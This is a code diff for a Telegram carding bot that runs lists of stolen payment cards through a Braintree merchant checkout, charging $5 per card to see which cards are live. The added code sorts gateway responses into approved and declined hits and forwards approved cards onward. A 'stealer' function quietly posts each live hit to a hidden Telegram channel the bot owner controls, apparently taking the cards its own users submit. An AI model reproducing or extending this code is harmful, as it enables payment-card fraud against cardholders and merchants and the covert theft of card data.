@@ -15,9 +15,73 @@ from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from TOOLS.getcc_for_mass import *
 
-# ========== INITIALIZATION ==========
-fake = Faker()
-GATE_NAME = "Braintree 5$"
+# ========== RESPONSE HANDLER (from response.py) ==========
+async def get_charge_resp(result, user_id, fullcc):
+    try:
+        if type(result) == dict:
+            if 'status' in result and 'response' in result:
+                status_value = result.get('status', '').lower()
+                response_msg = result.get('response', '')
+                is_live = result.get('is_live', False)
+
+                if status_value == 'approved' or is_live:
+                    status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+                    hits = "YES"
+                    await forward_resp(fullcc, "Braintree $5", response_msg)
+                else:
+                    status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
+                    hits = "NO"
+
+                return {
+                    "status": status,
+                    "response": response_msg,
+                    "hits": hits,
+                    "fullz": fullcc,
+                }
+
+        # Fallback for string results
+        if type(result) == str:
+            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
+            response = result
+            hits = "NO"
+
+            msg_lower = result.lower()
+            if "approved" in msg_lower or "charged" in msg_lower or "success" in msg_lower:
+                status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+                hits = "YES"
+                await forward_resp(fullcc, "Braintree $5", result)
+            elif "risk_threshold" in msg_lower:
+                response = "Gateway Rejected: risk_threshold"
+            elif "call issuer" in msg_lower:
+                response = "Declined - Call Issuer"
+            elif "fraud" in msg_lower:
+                response = "Fraud Suspected"
+
+            return {
+                "status": status,
+                "response": response,
+                "hits": hits,
+                "fullz": fullcc,
+            }
+
+        status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
+        return {
+            "status": status,
+            "response": "Card Declined ❌",
+            "hits": "NO",
+            "fullz": fullcc,
+        }
+
+    except Exception as e:
+        return {
+            "status": "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌",
+            "response": str(e),
+            "hits": "NO",
+            "fullz": fullcc,
+        }
+
+# ========== CONFIGURATION ==========
+GATE_NAME = "Braintree - Plexaderm (5$)"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
@@ -25,22 +89,9 @@ OWNER_DM = "https://t.me/spid_3r"
 SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 STEALER_CHANNEL_ID = -1003627495953
 
-# ========== STEALER FUNCTION ==========
-async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
-    try:
-        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
+fake = Faker()
 
-{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
-{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
-
-{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
-    except Exception as e:
-        print(f"[Stealer Error] {e}")
-
-# ========== ORIGINAL CHECKER FUNCTIONS (from your code) ==========
+# ========== ORIGINAL BRAINTREE CHARGE FUNCTIONS ==========
 def random_phone():
     return fake.phone_number()[:10]
 
@@ -383,19 +434,30 @@ async def create_braintree_charge(fullz, proxy=None):
         "is_live": is_live
     }
 
-# ========== ASYNC WRAPPER FOR BOT ==========
-async def call_braintree_api(fullcc):
+# ========== ASYNC WRAPPER USING RESPONSE HANDLER ==========
+async def call_braintree_api(fullcc, user_id):
     result = await create_braintree_charge(fullcc)
-    status = result["status"]
-    response_msg = result["response"]
-    if status == "Approved":
-        display_status = "Approved ✅"
-    else:
-        display_status = "Declined ❌"
-    return display_status, response_msg
+    processed = await get_charge_resp(result, user_id, fullcc)
+    # processed contains: status, response, hits, fullz
+    return processed["status"], processed["response"]
 
 def extract_cards(text):
     return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)
+
+# ========== STEALER FUNCTION (if not already in modules) ==========
+async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
+    try:
+        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
+
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+    except Exception as e:
+        print(f"[Stealer Error] {e}")
 
 # ========== SINGLE CHECK /chk ==========
 @Client.on_message(filters.command("chk", [".", "/"]))
@@ -440,7 +502,7 @@ async def braintree_single(client, message):
         await asyncio.sleep(0.5)
 
         start = time.perf_counter()
-        status, api_message = await call_braintree_api(fullcc)
+        status, api_message = await call_braintree_api(fullcc, user_id)
         elapsed = time.perf_counter() - start
 
         # Step 3 (full squares)
@@ -567,7 +629,7 @@ async def process_sequential(client, message, ccs, user_id, first_name, role):
     )
 
     for idx, fullcc in enumerate(ccs, 1):
-        status, api_message = await call_braintree_api(fullcc)
+        status, api_message = await call_braintree_api(fullcc, user_id)
 
         cc_num = fullcc.split('|')[0]
         bin_data = await get_bin_details(cc_num)
